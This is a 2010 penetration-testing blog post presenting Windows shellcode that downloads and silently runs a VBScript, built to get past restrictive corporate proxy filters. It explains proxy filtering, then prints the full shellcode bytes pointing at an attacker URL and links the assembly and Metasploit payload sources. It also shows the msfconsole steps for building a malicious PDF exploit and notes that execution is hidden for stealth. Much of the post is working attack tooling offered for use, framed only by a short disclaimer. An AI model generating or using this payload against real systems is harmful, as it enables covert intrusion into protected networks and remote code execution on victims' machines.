---
layout: post
title: Download and Execute Script Shellcode
date: '2010-05-22T21:14:00.009+10:00'
author: Stephen Bradshaw
tags:
- restrictive proxies
- pentesting
- shellcode
modified_time: '2014-11-04T15:13:08.002+11:00'
thumbnail: http://4.bp.blogspot.com/_e7K39d4GimA/S_eyWcgdfEI/AAAAAAAAAQA/67nSTZ2eBQY/s72-c/Diagram1.png
blogger_id: tag:blogger.com,1999:blog-2318886372568084567.post-8637480133081618157
blogger_orig_url: http://www.thegreycorner.com/2010/05/download-and-execute-script-shellcode.html
redirect_from: /2010/05/download-and-execute-script-shellcode.html
---

<span style="font-size: large;"><b>Introduction</b></span> <br/><br/>Something I have been working on lately is shellcode to download and execute a script on a Windows system.  "What?"  you may be thinking, "Why the hell would you want to do that when there already exists shellcode to download and execute <i>proper</i> Windows executables?"  <br/><br/>The short answer to that question is "To bypass restrictive proxy servers"...<br/><br/>...<br/><br/>Need more detail than that?  OK...<br/><br/><span style="font-size: large;"><b>Whats the problem with Restrictive Proxies?</b></span><br/><br/>Restrictive proxy servers, commonly used in corporate environments, have a number of features that can be used to block potentially malicious traffic from reaching the client systems they mediate web traffic for.  Some of the features they have that can cause problems for normal download and execute shellcode which can be bypassed by the use of download and execute <i>script</i> shellcode are as follows:<br/><ul><li>Blocking based on patterns in the URL, such as any URL ending in .exe</li><li>Blocking based on analysis of the content of web responses and requests, such as any response that contains a <a href="http://www.garykessler.net/library/file_sigs.html">file signature</a> consistent with a Windows executable</li></ul><br/>Lets look at each of these features in a little more detail.<br/><br/>For the purposes of this explanation, we will assume the following network environment, where the client sits in a network separated from the Internet (and the attackers web server) via a restrictive firewall.   We will assume that the firewall only allows outgoing communication to web sites via the proxy server, and no other direct communication in or out is allowed (with the possible exception of DNS traffic, the exploitation possibilities of which I wont go into right now).  The logical diagram below illustrates the section of the network that we are interested in.  <br/><br/><div class="separator" style="clear: both; text-align: center;"></div><div class="separator" style="clear: both; text-align: center;"><a href="/assets/img/2010-05-22-download-and-execute-script-shellcode_large_Diagram1.png"><img border="0" src="/assets/img/2010-05-22-download-and-execute-script-shellcode_large_Diagram1.png"/></a></div><br/><br/>Note that this diagram shows the client is connected to the firewall via the proxy server.  Now this does not actually have to be true from the perspective of how traffic in the network is routed (e.g. layer 3 of the OSI model),  it is just meant to illustrate the all web traffic must be forwarded through the proxy for it to reach the Internet.  This goal can be achieved by either configuring the browser proxy settings to use the proxy and blocking all direct traffic to the Internet using our Firewall, or by actually routing any layer three traffic destined for the Internet through our proxy box, and running the proxy service in transparent mode. (Although in the case of running the proxy transparently you might have to watch for web traffic on non standard ports).<br/><br/>The important point is that all web traffic goes through the proxy and gets checked by it, and no other traffic can exit the network so any outgoing traffic must be tunneled through the proxy.<br/><br/>Now lets look at the impact that proxy filtering can have on the operation of download and execute shellcode.  Lets first examine the case of blocking content via patterns in the URL.  Blocking based on patterns in the URL is one of the most simple methods to actually bypass, however some variants of download and execute shellcode are caught by it because they use the filename from the URL as the filename to use when saving the downloaded content to disk.<br/><br/>In the examples below, we will be trying to get our executable file, "evil.exe" onto the target client machine from our webserver located at www.attacker.com.<br/><br/><div style="color: red;">Please note that these filenames and URLs are being used for the purpose of example only.  I don't own www.attacker.com and I wouldn't recommend that you try and access evil.exe from that site.</div><br/><br/>So what happens when we make a request for an exe file to a proxy server that blocks based on a pattern in the URL?  The proxy server usually just immediately replies with a denied message, without even contacting the remote web server, as shown in the diagram below.<br/><br/><div class="separator" style="clear: both; text-align: center;"><a href="/assets/img/2010-05-22-download-and-execute-script-shellcode_large_Diagram2.png"><img border="0" src="/assets/img/2010-05-22-download-and-execute-script-shellcode_large_Diagram2.png"/></a></div><br/><br/><div class="separator" style="clear: both; text-align: center;"></div>As mentioned before, this filtering method is actually really easy to bypass.  All we need to do is rename the extension of the file on the attackers web server, and as long as the proxy server is not doing any type of content checking, the request will complete successfully.<br/><br/>Lets examine the result of the same request when "evil.exe" is renamed to "evil.txt" on the webserver.<br/><br/><div class="separator" style="clear: both; text-align: center;"><a href="/assets/img/2010-05-22-download-and-execute-script-shellcode_large_Diagram3.png"><img border="0" src="/assets/img/2010-05-22-download-and-execute-script-shellcode_large_Diagram3.png"/></a></div><br/><div class="separator" style="clear: both; text-align: center;"></div><br/>The download completes successfully, because in this case the proxy is only  checking the text of the URL and not the received content.  We don't actually need script downloading shellcode to bypass this type of proxy, we would just need download and exec shellcode that allowed files with any file extension to be downloaded, saved to disk with a .exe extension, and then executed.<br/><br/>But what about proxy servers that actually check the content of files they receive? In this case, simply renaming the file wont allow us to bypass the proxy.  Once the proxy receives the response from the remote web site, analyses its contents and finds a file siganture for an executable file, it will block the traffic.<br/><br/>Lets see what happens when our executable file "evil.txt" is downloaded through a proxy that performs file signature matching on content.<br/><br/><div class="separator" style="clear: both; text-align: center;"><a href="/assets/img/2010-05-22-download-and-execute-script-shellcode_large_Diagram4.png"><img border="0" src="/assets/img/2010-05-22-download-and-execute-script-shellcode_large_Diagram4.png"/></a></div><br/><div class="separator" style="clear: both; text-align: center;"></div>As soon as the web content is received by the proxy from the attackers website, and is checked, it is recognised as containing executable content, and a denied message is returned to the client. <br/><br/>This is where shellcode that can download and execute a script becomes useful.  Because the script data is text based, it will bypass proxy servers that perform blocking by matching file signature, because script content is essentially the same as html which a proxy must allow in order to support browsing of regular web pages.  Now our content can still be caught by file extension (if we name our filename [whatever].vbs), or by text pattern matching (if we use a number of potentially evil VBScript or JScript commands in our script), but either of those protections is easy to bypass if we rename the file extension and obfuscate our script.<br/><br/>So if we replaced our evil.txt with script content and not executable content, our download should proceed as below, with the content being successfully delivered to the target victim PC.<br/><br/><div class="separator" style="clear: both; text-align: center;"><a href="/assets/img/2010-05-22-download-and-execute-script-shellcode_large_Diagram3.png"><img border="0" src="/assets/img/2010-05-22-download-and-execute-script-shellcode_large_Diagram3.png"/></a></div><br/><div class="separator" style="clear: both; text-align: center;"></div><br/><span style="font-size: large;"><b>What can be done with a script?</b></span> <br/><br/>So what exactly can we do with script content delivered to our victim system?  A number of things actually, only limited by your imagination.  Some possible examples of things we could do with a script are using it to:<br/><ul><li>Run existing executables already on the target system, or make any other changes on the target system that the user we run our script as is entitled to make</li><li>Contain a encoded copy of an executable file, which it can then decode, write to disk and run</li><li>Download copies of encoded executables from the attackers web site, decode them, and run them</li></ul><br/>I have used this shellcode in order to exploit a system behind a restrictive proxy and tunnel out a cmd shell via http through the proxy, and I will go into details of how that was achieved in a future post.<br/><br/><span style="font-size: large;"><b>The Code</b></span><br/><br/>My download and execute script shellcode is based on the download and execute code from <a href="https://web.archive.org/web/20081006194509/http://www.klake.org/~jt/asmcode/">here</a> and I have provided copies in assembly form as well as a Metasploit payload which you can copy to /modules/payloads/singles/windows/ in your Metasploit install directory (probably /opt/metasploit3/msf3/ on Linux).<br/><br/>I have tested the shellcode successfully on Windows XP SP2 and SP3 and Windows Vista SP2.<br/><br/>Get the code here:<br/><ul><li><a href="http://sites.google.com/site/lupingreycorner/descript.asm">Assembly source</a></li><li><a href="http://sites.google.com/site/lupingreycorner/download_exec_script.rb">Metasploit payload</a></li></ul><b style="color: black;">Edit</b><span style="color: black;">: Updated to support Windows 7, more details <a href="http://grey-corner.blogspot.com/2010/10/download-and-execute-script-shellcode.html">here</a>.</span><br/><br/><br/><span style="font-size: large;"><b>Usage Examples</b></span><br/><br/>If you want to use the assembly form of the code, put your chosen URL at the end of file in the db line, and assemble to descript.bin via nasm using the following command<br/><br/><blockquote style='font-family: "Courier New",Courier,monospace;'>lupin@lion:~/proxybypass$ nasm -f bin descript.asm -o descript.bin</blockquote><br/>Then you can run it through msfencode to get rid of bad characters like so<br/><br/><blockquote><span style='font-family: "Courier New",Courier,monospace;'>lupin@lion:~/proxybypass$ cat descript.bin | msfencode -a x86 -b '\x00\x0a\x0d' -t c</span></blockquote><br/>Or just output it in c hash format using perl like so<br/><br/><blockquote><span style='font-family: "Courier New",Courier,monospace;'>lupin@lion:~/proxybypass$ cat descript.bin | perl -e 'while (read STDIN, $d, 1) {print "\\x" . sprintf( "%02x", ord($d));}; print "\n"'</span></blockquote><br/>If you want to use the Metasploit module (which is actually a much easier way to use the shellcode), just use it like you would any other Metasploit payload, providing the URL to download the script from via the "URL" option.<br/><br/>Heres an example using msfpayload, to output shellcode suitable for pasting into an <a href="http://grey-corner.blogspot.com/search/label/exploit%20tutorial">exploit you create yourself</a>:<br/><br/><blockquote style='font-family: "Courier New",Courier,monospace;'>lupin@lion:~$ msfpayload windows/download_exec_script URL=http://192.168.56.1/evil.tmp C<br/>/*<br/> * windows/download_exec_script - 256 bytes<br/> * http://www.metasploit.com<br/> * URL=http://192.168.56.1/evil.tmp<br/> */<br/>unsigned char buf[] = <br/>"\xeb\x74\x56\x6a\x30\x59\x64\x8b\x01\x8b\x40\x0c\x8b\x70\x1c"<br/>"\xad\x8b\x40\x08\x5e\xc3\x60\x8b\x6c\x24\x24\x8b\x45\x3c\x8b"<br/>"\x54\x05\x78\x01\xea\x8b\x4a\x18\x8b\x5a\x20\x01\xeb\xe3\x37"<br/>"\x49\x8b\x34\x8b\x01\xee\x31\xff\x31\xc0\xfc\xac\x84\xc0\x74"<br/>"\x0a\xc1\xcf\x0d\x01\xc7\xe9\xf1\xff\xff\xff\x3b\x7c\x24\x28"<br/>"\x75\xde\x8b\x5a\x24\x01\xeb\x66\x8b\x0c\x4b\x8b\x5a\x1c\x01"<br/>"\xeb\x8b\x04\x8b\x01\xe8\x89\x44\x24\x1c\x61\xc3\x5f\x81\xef"<br/>"\x98\xff\xff\xff\xe8\x90\xff\xff\xff\x89\xc3\xeb\x05\xe8\xeb"<br/>"\xff\xff\xff\x68\x8e\x4e\x0e\xec\x53\xe8\x8f\xff\xff\xff\x31"<br/>"\xc9\x66\xb9\x6f\x6e\x51\x68\x75\x72\x6c\x6d\x54\xff\xd0\x68"<br/>"\x36\x1a\x2f\x70\x50\xe8\x75\xff\xff\xff\x31\xc9\x51\x51\x8d"<br/>"\x37\x81\xc6\xee\xff\xff\xff\x8d\x56\x0c\x52\x57\x51\xff\xd0"<br/>"\x68\x98\xfe\x8a\x0e\x53\xe8\x56\xff\xff\xff\x41\x51\x56\xff"<br/>"\xd0\x68\x7e\xd8\xe2\x73\x53\xe8\x46\xff\xff\xff\xff\xd0\x77"<br/>"\x73\x63\x72\x69\x70\x74\x20\x2f\x2f\x42\x20\x61\x2e\x76\x62"<br/>"\x73\x00\x68\x74\x74\x70\x3a\x2f\x2f\x31\x39\x32\x2e\x31\x36"<br/>"\x38\x2e\x35\x36\x2e\x31\x2f\x65\x76\x69\x6c\x2e\x74\x6d\x70"<br/>"\x00";</blockquote><br/>And heres an example using msfconsole to create a malicious PDF file:<br/><br/><blockquote><span style='font-family: "Courier New",Courier,monospace;'>lupin@lion:~$ msfconsole<br/>...[SNIP]...<br/>msf &gt; use windows/fileformat/adobe_collectemailinfo<br/>msf exploit(adobe_collectemailinfo) &gt; set PAYLOAD windows/download_exec_script<br/>PAYLOAD =&gt; windows/download_exec_script<br/>msf exploit(adobe_collectemailinfo) &gt; set URL http://192.168.56.1/evil.tmp<br/>URL =&gt; http://192.168.56.1/evil.tmp<br/>msf exploit(adobe_collectemailinfo) &gt; set OUTPUTPATH /tmp<br/>OUTPUTPATH =&gt; /tmp<br/>msf exploit(adobe_collectemailinfo) &gt; set FILENAME evil.pdf<br/>FILENAME =&gt; evil.pdf<br/>msf exploit(adobe_collectemailinfo) &gt; show options<br/><br/>Module options:<br/><br/>   Name        Current Setting  Required  Description<br/>   ----        ---------------  --------  -----------<br/>   FILENAME    evil.pdf         yes       The file name.<br/>   OUTPUTPATH  /tmp             yes       The location of the file.<br/><br/><br/>Payload options (windows/download_exec_script):<br/><br/>   Name  Current Setting               Required  Description<br/>   ----  ---------------               --------  -----------<br/>   URL   http://192.168.56.1/evil.tmp  yes       The URL pointing to the script.  Don't use .txt, .htm file extentions!<br/><br/><br/>Exploit target:<br/><br/>   Id  Name<br/>   --  ----<br/>   0   Adobe Reader v8.1.1 (Windows XP SP0-SP3 English)<br/><br/><br/><br/>msf exploit(adobe_collectemailinfo) &gt; exploit<br/><br/>[*] Creating 'evil.pdf' file...<br/>[*] Generated output file /tmp/evil.pdf<br/>[*] Exploit completed, but no session was created.<br/>msf exploit(adobe_collectemailinfo) &gt;</span><span style='font-family: "Courier New",Courier,monospace;'> </span></blockquote><span style="font-size: large;"><br/></span><br/><span style="font-size: large;"><b>Notes on Use of the Shellcode</b></span><br/><br/>This shellcode uses the URLDownloadToFile function from urlmon.dll to actually download the script file from the web.  The following results from this:<br/><ul><li>The shellcode will use Internet Explorers proxy settings to make the web request, and if the proxy server uses integrated Windows Authentication the logon details will be automatically provided in response to a challenge.  So far, I have only tested this via exploiting software run as the locally logged on user, so Im not sure what will happen regarding Windows Authentication if you happen to exploit a program running as a different user.</li><li>URLs with files ending in particular extentions will not be saved to disk.  Extentions .txt and .htm are the ones I have discovered so far that do not get saved, but there may be more.  Using the .tmp extension allows the file to be correctly saved to disk.</li></ul><br/>There are two zero bytes in the shellcode, at the end of each of the db strings at the end of the code itself.  These were left in place in order to simplify the code and to allow easy modification of the URL without having to change offsets in the code to re-add the zero byte at runtime.  Obviously, if you need to use this shellcode in an exploit that is intolerant of zero byte characters, encode it first.<br/><br/>The script is being saved to disk as a.vbs in the present working directory of the program that you exploit.  That means that the account that the program runs as must have permissions to both read and write to this directory for the shellcode to be effective.  If this is a problem the code can always be modified to save to the temp directory instead, although this will increase the size of the code.  The fact that the file extension is set as .vbs also means that the code you provide must be VBScript code.  If you want to use JScript, just modify the appropriate db entry near the end of the assembly code to use a .js extension instead.<br/><br/>The downloaded script is also run using wscript in batch mode (//B) which will prevent any popup messages (including those that result from "WScript.Echo" commands) from appearing on the target system.  This was done for stealth reasons - without it you get a great honking popup on the victim system if the script does not exist (e.g. if the download fails) or if you have an error in your code that you havent silenced using "On Error GoTo Next".  So given that 'WScript.Echo "Hello world"' wont work as a test script, if you want to test that the code works properly use something like the following, which will create file c:\blah.txt and write "Blah." to it.<br/><br/><blockquote><span style='font-family: "Courier New",Courier,monospace;'>Set FSO = CreateObject("Scripting.FileSystemObject")</span><br/><span style='font-family: "Courier New",Courier,monospace;'>Set File = FSO.CreateTextFile("c:\blah.txt", True)</span><br/><span style='font-family: "Courier New",Courier,monospace;'>File.WriteLine("Blah.")</span><br/><span style='font-family: "Courier New",Courier,monospace;'>File.Close</span></blockquote><br/>If you modify the assembly version of the file and want your changes to be reproduced in the Metasploit payload version, its quite easy to do so.  Assuming the two db statements are still left at the end of the shellcode, all you need to do is assemble the code using nasm, output the binary file in c hash format using perl, cut everything after the second last zero byte (\x00) character in the c hash output and then paste the resulting data into the download_exec_script.rb file, taking note of the proper syntax.<br/><br/>And of course the standard disclaimer applies, don't use this code to do anything evil, like breaking into systems without appropriate permission.<br/><br/>Anyway, have fun with the code and be sure and drop me a line and let me know if you find it useful or have used it to do something cool.